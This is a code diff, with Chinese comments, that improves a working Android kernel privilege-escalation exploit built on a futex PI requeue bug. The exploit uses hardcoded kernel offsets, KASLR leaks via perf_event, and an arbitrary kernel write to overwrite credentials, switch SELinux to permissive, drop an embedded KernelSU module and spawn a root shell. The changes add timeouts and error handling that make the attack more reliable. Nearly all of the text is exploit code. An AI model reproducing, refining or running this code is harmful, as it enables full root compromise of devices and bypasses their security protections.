@@ -55,6 +55,32 @@ static double timer_ms(void) {
 }
 #define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
 
+/* 等待条件成立，超时则报错退出（避免无限自旋） */
+#define WAIT_UNTIL(cond, timeout_ms, what) do { \
+    struct timespec _s, _n; clock_gettime(CLOCK_MONOTONIC, &_s); \
+    for (;;) { \
+      if (cond) break; \
+      clock_gettime(CLOCK_MONOTONIC, &_n); \
+      long _el = (_n.tv_sec - _s.tv_sec) * 1000L + \
+                 (_n.tv_nsec - _s.tv_nsec) / 1000000L; \
+      if (_el > (timeout_ms)) pr_error("timeout: %s\n", what); \
+      sched_yield(); \
+    } \
+  } while (0)
+
+/* 等待原子变量，超时返回 0（供线程使用，不退出进程） */
+static int wait_atomic_ms(atomic_int *v, long ms) {
+  struct timespec s, n;
+  clock_gettime(CLOCK_MONOTONIC, &s);
+  for (;;) {
+    if (atomic_load(v)) return 1;
+    clock_gettime(CLOCK_MONOTONIC, &n);
+    long el = (n.tv_sec - s.tv_sec) * 1000L + (n.tv_nsec - s.tv_nsec) / 1000000L;
+    if (el > ms) return 0;
+    sched_yield();
+  }
+}
+
 #define LINK_TEXT UINT64_C(0xffffffc010080000)
 #define OFF_INIT_TASK UINT64_C(0x2ca2800)
 #define OFF_INIT_CRED UINT64_C(0x2caf850)
@@ -224,7 +250,7 @@ static uint64_t leak_task_from_status(const char *status_path, uint64_t *cred_ou
   size_t map_size = (size_t)ps * 129;
   struct perf_event_mmap_page *m = mmap(NULL, map_size,
       PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-  if (m == MAP_FAILED) { close(fd); return 0; }
+  if (m == MAP_FAILED) { close(status_fd); close(fd); return 0; }
   ioctl(fd, PERF_EVENT_IOC_RESET, 0);
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
   char status[4096];
@@ -493,7 +519,7 @@ static void *thread_y(void *unused) {
   sa.sa_sigaction = sigusr2;
   sa.sa_flags = SA_SIGINFO | SA_RESTART;
   sigemptyset(&sa.sa_mask);
-  if (sigaction(SIGUSR2, &sa, NULL) != 0) return NULL;
+  if (sigaction(SIGUSR2, &sa, NULL) != 0) { atomic_store(&y_task_ready, -1); return NULL; }
   int tid = (int)syscall(__NR_gettid);
   atomic_store(&y_tid, tid);
   pr_info("Thread Y spawned with TID %d\n", tid);
@@ -504,13 +530,14 @@ static void *thread_y(void *unused) {
   k_y_task = leak_task_from_status(status_path, &y_cred);
   uint64_t syscall_sp = leak_syscall_sp();
   k_waiter = syscall_sp ? syscall_sp - 0x1D8 : 0;
-  (void)y_cred; (void)k_y_task; (void)k_waiter;
+  (void)y_cred; (void)k_waiter;
+  if (!k_y_task) { atomic_store(&y_task_ready, -1); return NULL; }
   atomic_store_explicit(&y_task_ready, 1, memory_order_release);
   if (y_leak_only) return NULL;
 
   if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
   atomic_store(&y_locked_l2, 1);
-  while (!atomic_load(&x_locked_l1)) sched_yield();
+  if (!wait_atomic_ms(&x_locked_l1, 10000)) return NULL;
   atomic_store(&y_parking, 1);
 
   pr_info("Thread Y: waiting requeue on cond futex...\n");
@@ -534,14 +561,14 @@ static void *thread_y(void *unused) {
   struct timespec zero = {0, 0};
   (void)raw_futex(&dummy, LOCK_PI_PRIVATE, 0, (long)&zero, NULL, 0);
   (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
-  while (!atomic_load(&x_done)) sched_yield();
+  if (!wait_atomic_ms(&x_done, 10000)) return NULL;
   return NULL;
 }
 
 static void *thread_x(void *unused) {
   (void)unused;
   pr_info("Thread X spawned\n");
-  while (!atomic_load(&y_locked_l2)) sched_yield();
+  if (!wait_atomic_ms(&y_locked_l2, 10000)) return NULL;
   if (raw_futex(&pi1, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
   atomic_store(&x_locked_l1, 1);
   atomic_store(&x_blocking, 1);
@@ -583,7 +610,7 @@ static int write_value(uint64_t target, uint64_t value) {
   atomic_store(&respray_done, 0);
 
   atomic_store_explicit(&respray_ready, 1, memory_order_release);
-  while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
+  WAIT_UNTIL(atomic_load_explicit(&respray_done, memory_order_acquire), 10000, "PI arb-write");
   if (atomic_load(&respray_done) < 0) {
       pr_error("PI arb-write failed to stamp waiter.\n");
   }
@@ -600,20 +627,32 @@ static int g_permissive_only;
 static char g_shell_path[256] = "/system/bin/sh";
 
 
+/* 取路径的 basename 作为 argv[0]（bash/toybox 等多调用程序依赖它） */
+static const char *path_basename(const char *p) {
+  const char *s = strrchr(p, '/');
+  return s ? s + 1 : p;
+}
+/* ---------------------------------------------- */
+
 /* ---------- 释放内嵌的 kernelsu.ko ---------- */
 extern const unsigned char _binary_kernelsu_ko_start[];
 extern const unsigned char _binary_kernelsu_ko_end[];
 
 static void ksu_release_module(void) {
   const char *path = "/data/local/tmp/kernelsu.ko";
-  int existed = (access(path, F_OK) == 0);
-  if (existed && !g_force_release) {
-    pr_info("[KSU] %s exists, not overwritten (use -f to force)\n", path);
-    return;
-  }
   size_t len = (size_t)(_binary_kernelsu_ko_end - _binary_kernelsu_ko_start);
   if (!len) { pr_warning("[KSU] embedded module is empty\n"); return; }
-  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+
+  int existed = 0;
+  int fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0644);
+  if (fd < 0 && errno == EEXIST) {
+    existed = 1;
+    if (!g_force_release) {
+      pr_info("[KSU] %s exists, not overwritten (use -f to force)\n", path);
+      return;
+    }
+    fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC, 0644);
+  }
   if (fd < 0) {
     pr_warning("[KSU] cannot release %s: %s\n", path, strerror(errno));
     return;
@@ -621,7 +660,11 @@ static void ksu_release_module(void) {
   size_t off = 0;
   while (off < len) {
     ssize_t n = write(fd, _binary_kernelsu_ko_start + off, len - off);
-    if (n <= 0) { close(fd); pr_warning("[KSU] write %s failed\n", path); return; }
+    if (n <= 0) {
+      close(fd); (void)unlink(path);
+      pr_warning("[KSU] write %s failed (partial file removed)\n", path);
+      return;
+    }
     off += (size_t)n;
   }
   close(fd);
@@ -667,12 +710,16 @@ static const char ksu_script[] =
 
 static void ksu_release_script(void) {
   const char *path = "/data/local/tmp/kernelsu.sh";
-  int existed = (access(path, F_OK) == 0);
-  if (existed && !g_force_release) {
-    pr_info("[KSU] %s exists, not overwritten (use -f to force)\n", path);
-    return;
+  int existed = 0;
+  int fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0755);
+  if (fd < 0 && errno == EEXIST) {
+    existed = 1;
+    if (!g_force_release) {
+      pr_info("[KSU] %s exists, not overwritten (use -f to force)\n", path);
+      return;
+    }
+    fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC, 0755);
   }
-  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
   if (fd < 0) {
     pr_warning("[KSU] cannot release %s: %s\n", path, strerror(errno));
     return;
@@ -680,7 +727,11 @@ static void ksu_release_script(void) {
   size_t len = sizeof(ksu_script) - 1, off = 0;
   while (off < len) {
     ssize_t n = write(fd, ksu_script + off, len - off);
-    if (n <= 0) { close(fd); pr_warning("[KSU] write %s failed\n", path); return; }
+    if (n <= 0) {
+      close(fd); (void)unlink(path);
+      pr_warning("[KSU] write %s failed (partial file removed)\n", path);
+      return;
+    }
     off += (size_t)n;
   }
   close(fd);
@@ -698,7 +749,7 @@ static void usage(const char *prog) {
           "  -h, --help          Show this help\n"
           "\n"
           "Special:\n"
-          "  -s, --shell [PATH]  Root shell only (default /system/bin/sh)\n"
+          "  -s, --shell [PROGRAM]  Root shell only (default /system/bin/sh)\n"
           "  -f, --force         Overwrite existing released files\n"
           "  -p, --permissive-only  Only set SELinux permissive (no KSU, no shell)\n"
           "  --leak-only         Only run the KASLR/leak verification (no writes)\n"
@@ -742,7 +793,12 @@ int main(int argc, char **argv) {
     }
   }
 
-  /* 四种运行模式互斥：--shell / --permissive-only / --leak-only / --leak-y-only */
+  /* -s 本身就包含 permissive（不等子进程加载），-p 冗余；以 -s 为准 */
+  if (g_shell_mode && g_permissive_only) {
+    g_permissive_only = 0;
+  }
+
+  /* 其余模式互斥：--shell/--permissive-only / --leak-only / --leak-y-only */
   int mode_count = g_shell_mode + g_permissive_only + g_leak_only + y_leak_only;
   if (mode_count > 1) {
     pr_warning("conflicting modes: --shell / --permissive-only / --leak-only / "
@@ -799,7 +855,7 @@ int main(int argc, char **argv) {
   pthread_t tx, ty;
 
   if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
-  while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
+  WAIT_UNTIL(atomic_load(&y_task_ready) != 0, 10000, "Y task leak");
   if (atomic_load(&y_task_ready) < 0) { pr_error("Y task leak failed\n"); }
 
   if (y_leak_only) {
@@ -808,9 +864,9 @@ int main(int argc, char **argv) {
     return 0;
   }
 
-  while (!atomic_load(&y_locked_l2)) sched_yield();
+  WAIT_UNTIL(atomic_load(&y_locked_l2), 10000, "Y locks pi2");
   if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
-  while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
+  WAIT_UNTIL(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking), 10000, "X/Y setup");
 
   usleep(30000);
 
@@ -822,7 +878,7 @@ int main(int argc, char **argv) {
   if (r != -EDEADLK) {
     pr_error("CMP_REQUEUE_PI result: %ld (Expected: %d)\n", r, -EDEADLK);
   }
-  while (!atomic_load_explicit(&y_done, memory_order_acquire)) sched_yield();
+  WAIT_UNTIL(atomic_load_explicit(&y_done, memory_order_acquire), 10000, "sigreturn stamp");
   if (atomic_load(&y_done) < 0) {
     pr_error("sigreturn stamp failed\n");
   }
@@ -907,7 +963,7 @@ int main(int argc, char **argv) {
       fflush(stdout);
       signal(SIGHUP, SIG_DFL);
       setenv("PATH", "/sbin:/system/sbin:/system/bin:/system/xbin", 1);
-      execl(g_shell_path, "sh", (char *)NULL);
+      execl(g_shell_path, path_basename(g_shell_path), (char *)NULL);
       pr_warning("[CHILD] exec %s failed: %s\n", g_shell_path, strerror(errno));
       _exit(1);
     }
@@ -985,7 +1041,8 @@ int main(int argc, char **argv) {
     pr_success("init_cred uid/gid repaired to 0\n");
   }
 
-  TIMER("Exploit complete, waking child shell");
+  TIMER(g_permissive_only ? "Exploit complete, waking child"
+                          : "Exploit complete, waking child shell");
   __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
   fflush(stdout);
 
